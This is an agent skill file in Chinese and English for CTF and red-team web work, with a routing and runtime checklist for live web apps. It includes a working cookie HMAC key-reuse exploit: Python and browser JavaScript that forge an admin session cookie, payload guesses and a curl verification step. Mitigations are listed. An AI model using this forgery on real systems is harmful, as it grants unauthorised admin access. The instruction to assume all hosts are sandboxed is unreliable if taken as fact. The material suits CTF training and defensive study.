---
name: competition-web-runtime
description: Web 运行时专项：检查实时请求、路由、鉴权与 worker 流转
whenToUse: 面对活站要理清请求怎么流经路由/鉴权/worker 时加载
---

> 主题：Web 运行时链路（上游 `@dhicoc/dsh-reverse-skill` 的 CTF-Sandbox-Orchestrator 系列，MIT；已按本仓格式改写）

# Competition Web Runtime

Use this skill when the active challenge is primarily about web behavior, browser state, server routing, API order, or worker-backed application flow.

## Quick Start

1. Assume the presented hosts, domains, and routes belong to the sandbox.
2. Inspect entry HTML, boot scripts, runtime config, and route registration before trusting the visible UI.
3. Capture one real request flow end-to-end before making broad claims from source.
4. Check browser persistence and backend state together.
5. Re-run the smallest flow with one variable changed.

## Workflow

### 1. Map The Active Runtime

- Identify active hosts, paths, proxies, containers, and workers.
- Inspect cookies, localStorage, sessionStorage, IndexedDB, Cache Storage, and service workers.
- Record route names, feature flags, storage keys, queue names, and worker names that actually appear in the active flow.

### 2. Capture The Real Request Order

- Record exact host, path, query, headers, cookies, and body for decisive requests.
- Compare successful and failing paths.
- Treat UI gating as a hint, not proof of backend enforcement.

### 3. Expand Only After One Path Is Proven

- Trace middleware order, handlers, auth/session boundaries, uploads, exports, and background jobs.
- Verify hidden routes, alternate hostnames, preview modes, or worker side effects only after the first flow is grounded.

## Read This Reference

- Load `references/routing-runtime.md` for the detailed checklist, evidence packaging, and common web pitfalls.
- If the task is specifically about SSR loaders, template context, hydration payloads, preview rendering, or render-layer enforcement drift, prefer `$competition-template-render-path`.
- If the task is specifically about source maps, build manifests, chunk registries, emitted bundles, or recovering hidden runtime structure from served assets, prefer `$competition-bundle-sourcemap-recovery`.
- If the task is specifically about GraphQL schemas, RPC manifests, persisted queries, generated clients, or contract-to-handler drift, prefer `$competition-graphql-rpc-drift`.
- If the task is specifically about SSRF input points, internal endpoint reachability, metadata-service pivots, or token extraction through server-side fetches, prefer `$competition-ssrf-metadata-pivot`.
- If the task is specifically about race windows, ordering-dependent state mutation, duplicate action effects, or timing-sensitive drift, prefer `$competition-race-condition-state-drift`.
- If the task is specifically about proxy-backend parse differentials, path normalization drift, header ambiguity, or request smuggling routes, prefer `$competition-request-normalization-smuggling`.
- If the task is specifically about browser cookies, storage, IndexedDB, Cache Storage, service workers, or cached auth state, prefer `$competition-browser-persistence`.
- If the task is specifically about OAuth or OIDC redirects, callback params, PKCE, scopes, token exchange, or claim acceptance, prefer `$competition-oauth-oidc-chain`.
- If the task is specifically about JWT headers, claim normalization, key lookup, `kid`, `alg`, issuer or audience confusion, prefer `$competition-jwt-claim-confusion`.
- If the task is specifically about upload parsing, previews, archive extraction, converters, or deserialization chains, prefer `$competition-file-parser-chain`.
- If the task is specifically about queue payloads, worker-only behavior, retries, cron drift, or async side effects, prefer `$competition-queue-worker-drift`.
- If the task is specifically about WebSocket or SSE handshakes, subscriptions, realtime frames, reconnect logic, or frame-driven state changes, prefer `$competition-websocket-runtime`.
- If the task is specifically about Host headers, vhost routing, reverse proxies, or route-to-service resolution, prefer `$competition-runtime-routing`.
- If the only available evidence is a packet capture and the hard part is stream or protocol reconstruction, prefer `$competition-pcap-protocol`.

## What To Preserve

- Exact requests and responses that prove behavior
- Concrete file paths, function names, route names, and storage keys
- Queue payloads, worker names, or retry behavior when async processing matters

---

## 检查清单与常见坑（上游参考并入）

### cookie-hmac-key-reuse-auth-bypass

###### Cookie HMAC 密钥复用 → 后台认证绕过

> 当服务端将 URL 中公开的 access token 同时用作 Cookie 签名密钥，且后台直接信任 Cookie payload 中的声明字段时，可伪造管理员身份。

---

###### 适用场景

- 目标为 Web 应用，URL 路径中包含 `access_token` / `token` / `key` 等参数
- 响应头设置了签名 Cookie（如 `student_gate=<payload>.<signature>`）
- 存在多个签名 Cookie（学生端 + 管理端）共用一个密钥的可能
- 后台 Cookie payload 中包含客户端可控的权限声明（如 `{"admin":true}`）

###### 关键词

- HMAC key reuse / 签名密钥复用
- Known-key session forgery / 已知密钥会话伪造
- Client-side claims-based auth / 客户端声明式权限
- Cookie signature bypass / Cookie 签名绕过

###### 攻击流程

###### Step 1：从 URL 提取 access token

入口 URL 中通常可见：

```
/access/blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

提取 token：

```
blD4QO5On1O7G3M47ZxE4u93Qw4dr1ra
```

###### Step 2：观察 student_gate Cookie

访问入口，响应头会设置签名 Cookie。格式通常为：

```
Set-Cookie: <name>=<base64url(payload)>.<base64url(signature)>
```

解码 payload 确认内容结构。

###### Step 3：验证签名算法

用已知的 access token 作为 HMAC key，尝试重现签名：

```python
import hmac, hashlib, base64

access_token = "从URL提取的token"
payload_b64 = "从Cookie提取的payload部分"
expected_sig = "从Cookie提取的签名部分"

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

computed = b64url(hmac.new(
    access_token.encode(),
    payload_b64.encode(),
    hashlib.sha256
).digest())

print("匹配" if computed == expected_sig else "不匹配")
```

如果匹配 → 确认 `access token 就是 HMAC key`。

###### Step 4：猜测管理端 Cookie 名称和 payload 结构

常见的管理端 Cookie 名称：

- `admin_session`
- `admin_token`
- `admin_auth`
- `manage_token`
- `backstage_session`

Payload 结构试探方向（逐一尝试，直到命中 200）：

```json
{"admin":true}
{"role":"admin"}
{"isAdmin":true}
{"access":"admin"}
{"level":"admin"}
{"user":"admin"}
{"authenticated":true}
{"type":"admin"}
```

###### Step 5：伪造管理端 Cookie

```python
import hmac, hashlib, json, base64

access_token = "已知的token"
payload = {"admin": True}

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
sig = b64url(hmac.new(
    access_token.encode(), payload_b64.encode(), hashlib.sha256
).digest())

cookie = f"admin_session={payload_b64}.{sig}"
print(cookie)
```

###### Step 6：验证后台权限

```bash
curl -k -H "Cookie: <上一步得到的cookie>" https://target/api/admin/me
```

返回 `{"admin":true}` 或 200 + 管理员数据则成功。

###### 浏览器复现

```javascript
async function exploit() {
  const token = location.pathname.split('/access/')[1];
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey('raw', enc.encode(token),
    { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const payload = btoa('{"admin":true}').replace(/=/g, '');
  const sig = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig)))
    .replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
  document.cookie = `admin_session=${payload}.${sigB64}; path=/; Secure`;
  location.reload();
}
exploit();
```

###### 修复方案

1. 使用服务端独立密钥签名 Cookie，不和 URL token 共用
2. 后台权限基于服务端 session，而非客户端 Cookie payload 声明
3. 不同角色使用不同签名密钥
4. Cookie 中加入 `iat` / `exp` / `typ` 等声明并校验
5. 静默处理签名解析异常（失败返回 401，不返回 500）

###### 相关案例

- class.pangbaoba.me CTF 靶场后台绕过（student_gate 与 admin_session 共用 access token 作为 HMAC key，`{"admin":true}` 直接获得管理员权限）

###### 关联技能

- `CTF-Sandbox-Orchestrator/competition-web-runtime/SKILL.md` — Web 运行时分析
- `CTF-Sandbox-Orchestrator/competition-jwt-claim-confusion/SKILL.md` — 类似 token 声明混淆
- `reverse-engineering/languages-platforms.md` — JWT / OAuth 相关

### routing-runtime

###### Routing And Runtime Checklist

###### Inspect First

- Entry HTML, boot scripts, lazy chunks, hydration data, runtime config
- Browser storage, service workers, cached responses, transient globals
- Proxy headers, host headers, path prefixes, and base-URL derivation

###### High-Value Web Targets

- Hidden routes, debug pages, preview modes, experiment toggles
- Auth minting, refresh logic, cookie scope, header injection, role derivation
- Upload, import, export, archive, template, and deserialization boundaries
- Queue producers, background workers, cron tasks, and downstream state mutations

###### Evidence To Keep

- Exact request order and the one request that changes the conclusion
- Decisive request and response snippets instead of full trace dumps
- Storage keys, feature flags, queue names, and worker identifiers
- Route names, handler names, and proxy rules tied to runtime behavior

###### Common Pitfalls

- Trusting visible UI over backend enforcement
- Trusting checked-in source over actively served assets
- Ignoring proxy or routing inputs that alter behavior
- Expanding sideways before one minimal flow is reproduced

<!-- skill-link-graph:build-skill-graph.mjs 生成，勿手改 -->

## 链路位置（本技能不是孤岛：上游先做、下游交给谁、结果落哪个库）

- **阶段**：3 漏洞发现
- **互补**（同类场景一起用）：`competition-supply-chain`、`competition-template-render-path`、`competition-websocket-runtime`、`competition-zip-archive`
- **落库**（做完必须记进演练台，没落库的发现等于没发生）：`vuln` —— 用对应的 `redteam_*` 工具写入，带上原始请求/证据
- **收口必做**（打完不算完，要能证明）：命中判定走 `verification-discipline`（误报排除 + 修复五档判定）；打完之后要**补丁后复测**（补丁/修复后再打一遍，确认真的关掉了，而不是换个入口还能打）也走它；说清对手能不能发现走 `detection-pairing`（检测规则 + 响度）；战果归到哪个战术走 `attack-traceability`（ATT&CK 映射）。**出交付物用 `redteam_report`**（kind=score 出计分战报、kind=targets 出靶标清单），整条链路串起来看用 `redteam_attack_chain` / `redteam_attack_path` —— 这两个只在 `redteam-setup` 的工具表里登记过，做具体攻击时不会想到去翻，所以在这里点名

- **配套工具**（做完这步要落库/查询时用，别只记在上下文里）：`redteam_vuln_query`（按 severity/status/cve/cidr 组合筛，别在长列表里翻）

<!-- /skill-link-graph -->

## ATT&CK 映射

> 本技能会执行的手法对应 MITRE ATT&CK v20.1 下列技术（编号来自 `lib/redteam/attack-map.js`，唯一来源）。

| 战术 | 编号 | 技术 |
| --- | --- | --- |
| 初始访问 | T1190 | 利用面向公众的应用 |
| 执行 | T1059 | 命令与脚本解释器 |
| 持久化 | T1505.003 | Web Shell |

落到事实库时，把这几个编号写进 `attack_step` 的标题或 `detail`：报告与检测配对要靠它们对齐；
**没写编号的动作在「按 ATT&CK 复核」时等于不存在**（防守方按技术编号查日志，查不到就是漏）。
